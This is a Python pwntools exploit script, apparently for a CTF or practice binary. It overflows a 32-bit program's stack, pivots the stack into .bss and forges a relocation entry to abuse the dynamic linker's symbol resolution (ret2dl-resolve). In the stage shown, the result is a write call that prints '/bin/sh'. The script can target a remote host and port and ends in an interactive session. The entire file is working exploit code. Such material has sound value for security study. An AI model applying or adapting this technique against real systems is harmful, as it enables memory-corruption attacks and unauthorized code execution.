from pwn import *
context(os="linux", arch="i386")

def debug_on():
	if (args.DEBUG):
		context.log_level = "debug"

g_fname = "./main_partial_relro_32"
g_elf = ELF(g_fname)

if (args.LOCAL):
	g_io = process(g_fname)
else:
	g_io = remote(args.HOST, int(args.PORT))

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def pwn():
	padding_len = 0x70
	bss_addr = g_elf.bss()
	new_stk = bss_addr + 0x800

	rop = ROP(g_elf)
	rop.raw('a'*padding_len)
	rop.read(0, new_stk, 0x100) # size should be big enough.
	rop.migrate(new_stk)
	g_io.send(rop.chain())

	
	plt0 = g_elf.get_section_by_name(".plt")["sh_addr"]
	rel_plt = g_elf.get_section_by_name(".rel.plt")["sh_addr"]
	# From elf/dl-runtime.c:_dl_fixup
	# ElfN_Rela* reloc = D_PTR(l, l_info[DT_JMPREL]) + rloc_offset
	# D_PTR(l, l_info[DT_JMPREL]) <=> *l_info[DT_JMPREL].d_un.ptr == rel_plt
	# we make reloc_offset = fake_rel_offset = fake_addr - rel_ptr
	# thus reloc = rel_ptr + fake_rel_offset = fake_addr
	fake_rel_addr = new_stk + 0x80
	fake_rel_offset = fake_rel_addr - rel_plt # construct fake_rel at fake_reloc_addr
	
	# constrcut fake Elf32_Rel of write
	r_offset = g_elf.got["write"]
	r_info = 0x00000607

	rop = ROP(g_elf) # re-initialize rop
	rop.raw(plt0)
	rop.raw(fake_rel_offset)
	rop.raw(0xdeadbeef) # write's return address

	binsh_addr = fake_rel_addr + 8
	sh_str = "/bin/sh\0"
	# write(1, binsh_addr, len("/bin/sh\0"))'s args
	rop.raw(1)
	rop.raw(binsh_addr)
	rop.raw(len(sh_str))

	rop.raw('a' * (0x80 - len(rop.chain())))
	rop.raw(r_offset)
	rop.raw(r_info)
	rop.raw(sh_str)

	g_io.send(rop.chain())

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()
	
